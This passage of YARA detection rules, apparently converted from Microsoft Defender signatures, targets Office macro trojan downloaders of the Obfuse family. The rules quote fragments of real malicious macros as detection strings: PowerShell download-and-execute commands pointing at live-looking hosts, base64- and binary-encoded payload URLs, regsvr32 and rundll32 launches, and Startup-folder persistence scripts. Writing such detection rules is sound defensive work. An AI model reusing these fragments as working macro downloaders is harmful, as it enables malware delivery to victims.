        $x_1_2 = {3d 20 53 68 65 6c 6c 28 22 50 6f 77 65 72 53 68 65 6c 6c 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 3a 2f 2f 77 77 77 2e 67 72 65 79 68 61 74 68 61 63 6b 65 72 2e 6e 65 74 2f 74 6f 6f 6c 73 2f [0-32] 2e 65 78 65 27 2c 27 [0-32] 2e 65 78 65 27 29 3b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 27 [0-32] 2e 65 78 65 27 22 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CK_2147755774_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CK!MTB"
        threat_id = "2147755774"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \" http://maringareservas.com.br/mac.hta\"" ascii //weight: 1
        $x_1_2 = "= \"M\"" ascii //weight: 1
        $x_1_3 = "= \"S\"" ascii //weight: 1
        $x_1_4 = "= \"H\"" ascii //weight: 1
        $x_1_5 = "= \"T\"" ascii //weight: 1
        $x_1_6 = "= \"A\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YB_2147756375_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YB!MTB"
        threat_id = "2147756375"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 2e 65 78 65 63 40 28 [0-8] 29 2e}  //weight: 1, accuracy: Low
        $x_1_2 = {76 62 4e 65 77 4c 69 6e 65 20 26 20 [0-8] 28 28 57 53 63 72 69 70 74 2e 45 63 68 6f 28 29}  //weight: 1, accuracy: Low
        $x_1_3 = "A1:IV5000].SpecialCells(xlConstants)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YC_2147756425_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YC!MTB"
        threat_id = "2147756425"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 74 72 54 65 6d 70 20 3d 20 43 68 72 28 56 61 6c 28 22 26 48 22 20 2b 20 4d 69 64 28 68 65 78 74 6f 73 74 72 2c 20 [0-3] 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {64 20 3d 20 43 75 72 46 6f 6c 64 65 72 20 2b 20 22 [0-8] 2e 64 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = "obj3.ShellExecute \"rundll32" ascii //weight: 1
        $x_1_4 = "GetObject(ChrW(110) + ChrW(101) + ChrW(119) + ChrW(58) + ChrW(49) + ChrW(51) + ChrW(55)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YC_2147756425_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YC!MTB"
        threat_id = "2147756425"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TejEna = Dir(\"C:\\aaa_TouchMeNot.txt\")" ascii //weight: 1
        $x_1_2 = "GetObject(StrReverse(\"ss\" + \"ec\" + \"orP_\" + \"23n\" + \"iW\" + \":2\" + \"vmi\" + \"c\\t\" + \"oor:\" + \"stm\" + \"gm\" + \"n\" + \"iw\"))" ascii //weight: 1
        $x_1_3 = "Application.ExecuteExcel4Macro(TempC)" ascii //weight: 1
        $x_1_4 = "Set Ieraj = GetObject(\"winmgmts:\").Get(\"Win32_PingS\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PN_2147756440_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PN!MTB"
        threat_id = "2147756440"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"C:\\Users\\\" & Environ(\"UserName\") & \"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" ascii //weight: 1
        $x_1_2 = {3d 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 2b 20 22 5c 22 20 2b 20 52 61 6e 64 4e 61 6d 65 28 [0-5] 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".CreateTextFile(pathAuto + \"update.bat\")" ascii //weight: 1
        $x_1_4 = "= ActiveDocument.Shapes(1).TextFrame.TextRange.Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PQ_2147756506_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PQ!MTB"
        threat_id = "2147756506"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= pathData & \"\\vshostvba.cry\"" ascii //weight: 1
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 45 78 65 63 20 70 61 74 68 44 61 74 61 20 26 20 22 5c [0-32] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 57 72 69 74 65 20 43 68 72 28 41 73 63 28 6f 62 6a 53 74 72 65 61 6d 49 6e 2e 52 65 61 64 28 31 29 29 20 58 6f 72 20 [0-16] 28 69 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PQ_2147756506_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PQ!MTB"
        threat_id = "2147756506"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DH66OPQX7N(\"ubc/" ascii //weight: 1
        $x_1_2 = "hoq/5555550tsptsvd0tfttbmd0ttj" ascii //weight: 1
        $x_1_3 = "DH66OPQX7N(\"fyf/" ascii //weight: 1
        $x_1_4 = "qnu]sjeqnu]djmcvQ]tsftV" ascii //weight: 1
        $x_1_5 = "CreateProcessA(0&, R + \" \" + p" ascii //weight: 1
        $x_1_6 = "Shell R + \" \" + p" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_V_2147756576_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.V!MTB"
        threat_id = "2147756576"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".CreateTextFile(Environ$(\"HOMEPATH\") & \"\\\\\" & \"AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pepsi.bat\"," ascii //weight: 1
        $x_1_2 = {2e 57 72 69 74 65 20 [0-30] 26 20 22 22 20 26 20 [0-30] 26 20 22 20 2d 66 20 2d 64 65 63 6f 64 65 20 22 22 43 3a 25 48 4f 4d 45 50 41 54 48 25 5c 64 57 69 66 69 22}  //weight: 1, accuracy: Low
        $x_1_3 = ".CreateTextFile(Environ$(\"HOMEPATH\") & \"\\\\\" & \"dWifi\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AK_2147756582_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AK!MTB"
        threat_id = "2147756582"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "o3 = Replace(Join(qT, \"\"), km, \"\")" ascii //weight: 1
        $x_1_2 = "qT = Split(o3, CB)" ascii //weight: 1
        $x_1_3 = "RR.K \"regsvr\" & 32 & \" \" & E(I, 1)" ascii //weight: 1
        $x_1_4 = "URLDownloadToFile 0, P6, mc, 0, 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YD_2147756709_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YD!MTB"
        threat_id = "2147756709"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Hruort = saveFolder & \"\\Gertos.cmd\"" ascii //weight: 1
        $x_1_2 = "strTemp = Chr$(Val(\"&\" + \"H\" + Mid$(Biola, G, 2)))" ascii //weight: 1
        $x_1_3 = "saveFolder = \"C:\\programdata" ascii //weight: 1
        $x_1_4 = ".Path & \"\\Primer.txt\" For Input As" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_TB_2147757348_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.TB!MTB"
        threat_id = "2147757348"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = "\"powershell.exe \"\"IEX ((new-object net.webclient)" ascii //weight: 1
        $x_1_3 = ".downloadstring('http://" ascii //weight: 1
        $x_1_4 = "18.141.200.95/img/payload.txt" ascii //weight: 1
        $x_1_5 = "Shell (exec)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OT_2147757512_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OT!MTB"
        threat_id = "2147757512"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\h1.xsl\"" ascii //weight: 1
        $x_1_2 = "\\h1.com\"" ascii //weight: 1
        $x_1_3 = "frm.textbox2.text" ascii //weight: 1
        $x_1_4 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_5 = ".exec aqTf5d" ascii //weight: 1
        $x_1_6 = "(\"comments\") & agHu8" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BM_2147758180_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BM!MTB"
        threat_id = "2147758180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FindWindowExA" ascii //weight: 1
        $x_1_2 = "user32.dll" ascii //weight: 1
        $x_1_3 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_4 = "Debug.Print" ascii //weight: 1
        $x_1_5 = "= Join(Array(Chr(CLng" ascii //weight: 1
        $x_1_6 = "= Len(Join(Array(\"sGTGkk4DTUozdev9jEjKLg" ascii //weight: 1
        $x_1_7 = "= Len(Join(Array(RDq56r2D_wYV07a_yZeegAQ_guVUTc" ascii //weight: 1
        $x_1_8 = "= Len(Join(Array(gW7hNutTolCIZtMEhI4" ascii //weight: 1
        $x_1_9 = "= KkNwAF6PGTSCFI2axGia5.sGDtE3YE_YT74UOD" ascii //weight: 1
        $x_1_10 = "= GIoyZjr6_6YfR8E_Mgfjwdj_mpJ9RMj.KfvWmHYifShbJ0" ascii //weight: 1
        $x_1_11 = "= VaOfBpE_mKX3uo_I2l18xn.WCGDQrVs_0XkAzve_qSTrdZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BM_2147758180_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BM!MTB"
        threat_id = "2147758180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FindWindowExA" ascii //weight: 1
        $x_1_2 = "user32.dll" ascii //weight: 1
        $x_1_3 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_4 = "Debug.Print" ascii //weight: 1
        $x_1_5 = "= Join(Array(Chr(CLng" ascii //weight: 1
        $x_1_6 = "= Len(Join(Array(ZOBY48DdD78na9" ascii //weight: 1
        $x_1_7 = "= Len(Join(Array(S7JJkflVlKc0l9" ascii //weight: 1
        $x_1_8 = "= Len(Join(Array(AahzEKzmjP3Yu8Y2JwEBTlmDZr" ascii //weight: 1
        $x_1_9 = "= Len(Join(Array(RGkZC0Kyz0hvXQlFwtzgTk0J0k8" ascii //weight: 1
        $x_1_10 = "= Len(Join(Array(QrBFH2pF_UDQkaDq_I0TDB5" ascii //weight: 1
        $x_1_11 = "= NYL0TaNG0Q5Unn0m29cAZy0tNn.ZQ6ZBcQyAeJxB100CAO2BU" ascii //weight: 1
        $x_1_12 = "= yi5I2gPHMUiChJnxZyYEh0LIhk0.JvOP7Qkip5sqimgGN6J6v" ascii //weight: 1
        $x_1_13 = "= rzIk0s4_Dp5E68.tfpUnym7RFLXYHpqMl5Wh" ascii //weight: 1
        $x_1_14 = "= fr65eT05_DTNrozj_0kN6Qr_YaaxS3.yJD1dh6_HprsVU_fibqc6e" ascii //weight: 1
        $x_1_15 = "= T02K3cjC_P8h1rS_lHmMbSB.aeDPEhLW_9If68x" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FR_2147758396_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FR!MTB"
        threat_id = "2147758396"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AutoOpen()" ascii //weight: 1
        $x_1_2 = "ActiveWindow.DocumentMap" ascii //weight: 1
        $x_1_3 = "ActiveWindow.DisplayVertical" ascii //weight: 1
        $x_1_4 = "Environ(\"tmp\") & \"\\index.jpg\"" ascii //weight: 1
        $x_1_5 = "ActiveDocument.ActiveThemeDisplayName" ascii //weight: 1
        $x_1_6 = "Call f499d0f8.exe" ascii //weight: 1
        $x_1_7 = "Call a8a0e585.exe" ascii //weight: 1
        $x_1_8 = ".Open(\"GET\", d3395e4b, False)" ascii //weight: 1
        $x_1_9 = ".Open(\"GET\", fe32a5ca, False)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FD_2147758400_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FD!MTB"
        threat_id = "2147758400"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "57 53 63 72 69 70 74 2E 53 68 65 6C 6C\")).Run" ascii //weight: 1
        $x_1_2 = "aHR0cDovL3Nob3BwaG9uZ3RpbmguY29tL0xpbWVfTGltZVJhdC5leGU=" ascii //weight: 1
        $x_1_3 = "cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLVcgSGlkZGVuIC1jb21tYW5kIChuZXctb2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJw==" ascii //weight: 1
        $x_1_4 = "JywkZW52OlRlbXArJ1xzdmNob3N0LmV4ZScpOyhOZXctT2JqZWN0IC1jb20gU2hlbGwuQXBwbGljYXRpb24pLlNoZWxsRXhlY3V0ZSgkZW52OlRlbXArJ1xzdmNob3N0LmV4ZScp" ascii //weight: 1
        $x_1_5 = "nGroup" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ML_2147758510_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ML!MTB"
        threat_id = "2147758510"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open \"GET\", \"http://185.243.215.213/sys_info.vbs\"" ascii //weight: 1
        $x_1_2 = "savetofile \"sys_info.vbs" ascii //weight: 1
        $x_1_3 = "Shell \"wscript sys_info.vbs" ascii //weight: 1
        $x_1_4 = "Http.Send" ascii //weight: 1
        $x_1_5 = ".write xHttp.responseBody" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRZ_2147759158_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRZ!MTB"
        threat_id = "2147759158"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"\"aHR0cDovLzE5OC4xMi42Ni4xMDkvbktlWXBqWmpZaVB0Q0JuLmV4ZQ==\"\" \" + vbCrLf" ascii //weight: 1
        $x_1_2 = "=\"\"WXBqWmpZaVB0Q0JuLmV4ZQ==\"\"\" + vbCrLf" ascii //weight: 1
        $x_1_3 = {3a 45 78 65 63 75 74 65 28 [0-5] 29 22 22 29 22 20 2b 20 76 62 43 72 4c 66}  //weight: 1, accuracy: Low
        $x_1_4 = {45 78 65 63 75 74 65 28 22 22 70 61 74 68 20 3d 20 70 61 74 68 20 2b 20 22 22 22 22 64 61 74 61 5c [0-5] 22 22 22 22 20 2b 20 22 22 22 22 2e 74 78 74 22 22 22 22 22 22 29 22 20 2b 20 76 62 43 72 4c 66}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"C:\\\" + xxxxxpath + \"System32\\c\" + \"script\" + \".ex\"" ascii //weight: 1
        $x_1_6 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 45 76 61 6c 20 28 [0-37] 2e 52 75 6e 28 50 61 74 68 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YF_2147759161_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YF!MTB"
        threat_id = "2147759161"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://40.125.65.33/async.exe" ascii //weight: 1
        $x_1_2 = "async.exe\", 2 ' 1" ascii //weight: 1
        $x_1_3 = "ActiveWorkbook.Path & \"\\async.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SKM_2147759162_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SKM!MTB"
        threat_id = "2147759162"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rundoc (tmp & \"\\\" & ActiveDocument.Name & \".doc\")" ascii //weight: 1
        $x_1_2 = "= wsl.ExpandEnvironmentStrings(\"%localapp\" & \"data%\\T\" & \"emp\")" ascii //weight: 1
        $x_1_3 = "ActiveDocument.Unprotect (\"oikmseM#*inmowefj8349an3\")" ascii //weight: 1
        $x_1_4 = "For i = ActiveDocument.Shapes.Count To ActiveDocument.Shapes.Count + 1 - ActiveDocument.ActiveWindow.Panes(1).Pages.Count * 2 Step -1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRY_2147759789_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRY!MTB"
        threat_id = "2147759789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SFRUUERvd25sb2FkICJodHRwOi8vd3d3LndoZXJldmVyLmNvbS9maWxlcy9wYXlsb2FkLmV4ZSIsICJDOlx0ZW1wIg==" ascii //weight: 1
        $x_1_2 = "ICAgIFNldCBXc2hTaGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik=" ascii //weight: 1
        $x_1_3 = "ICAgIFdzaFNoZWxsLlJ1biAiYzpcdGVtcFxwYXlsb2FkLmV4ZSI=" ascii //weight: 1
        $x_1_4 = "Shell \"wscript D:\\_notScanned\\test.vbs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRT_2147759877_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRT!MTB"
        threat_id = "2147759877"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"FZ.tmp\"" ascii //weight: 1
        $x_1_2 = "= \"regsv\"" ascii //weight: 1
        $x_1_3 = "frm.fff \"http://804gtd.com/hboneb/sol95.php?l=puom9.cab" ascii //weight: 1
        $x_1_4 = "PL.exec Xd + \"r32" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRT_2147759877_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRT!MTB"
        threat_id = "2147759877"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "00110001,00111001,00110010,00101110,00110010,00110010,00110111,00101110,00110001,00110101,00111000,00101110,00110001,00110001,00110001,00101111,01000001,01100011,01110010,01101111,01100010,01100001,01110100,01000100,01000011,00101110,01100101,01111000," ascii //weight: 1
        $x_1_2 = "00101100,00100100,01100101,01101110,01110110,00111010,01110100,01100101,01101101,01110000,00101011,00100111,00100111,01011100,01100001,01100011,01100100,00101110,01100101,01111000," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRS_2147759878_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRS!MTB"
        threat_id = "2147759878"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "00110001,00111001,00111000,00101110,00110010,00110011,00101110,00110010,00110101,00110001,00101110,00110001,00110001,00110000,00101111,01101101,01100001,01110110,01101001,01101110,00101110,01100101,01111000,01100101" ascii //weight: 1
        $x_1_2 = "Powershell.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRS_2147759878_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRS!MTB"
        threat_id = "2147759878"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = "DHlbKUIKYUGkgjHVFIum = ProgramData" ascii //weight: 1
        $x_1_3 = "= Environ$(\"UserProfile\") & \"\\\" & " ascii //weight: 1
